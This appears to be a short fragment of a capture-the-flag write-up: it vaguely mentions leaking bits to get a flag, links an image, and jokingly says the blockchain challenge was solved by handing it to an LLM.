It will increasingly leak more bits until get flag.  
![image](https://github.com/user-attachments/assets/c0f81060-a30e-4e0c-b826-650321fa7d2c)

## Blockchain
1. Dump the challenge to LLM.
2. Do whatever it tells you to.
3. Profit.
